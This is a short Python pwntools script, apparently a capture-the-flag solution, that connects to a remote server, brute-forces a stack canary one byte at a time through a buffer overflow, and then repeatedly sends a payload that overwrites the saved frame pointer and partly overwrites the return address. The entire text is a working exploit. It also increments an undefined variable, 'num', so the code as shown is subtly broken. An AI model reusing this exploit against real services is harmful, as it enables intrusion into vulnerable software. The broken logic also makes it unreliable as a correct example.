from pwn import *
import time
p=remote('47.94.206.10',20071)
context.arch='amd64'
canary=b'\x00'
def check(add):
    p.recvuntil(b'welcome\n')
    payload=b'a'*0x68+canary+add
    p.send(payload)
    recv=p.recvuntil(b'fun\n',timeout=0.25)
    if b'fun\n' in recv:
        return True
    else:
        return False
for j in range(7):
    for i in range(0x100):
        if check(p8(i)):
            canary+=p8(i)
            num+=1
            print(hex(i))
            break
print('canary',hex(u64(canary)))
context.log_level = 'debug'
while 1:
    payload=b'a'*0x68+canary+p64(0x7fffffffeee0)+p8(0x31)+p8(0x12)
    p.recvuntil(b'welcome\n')
    p.send(payload)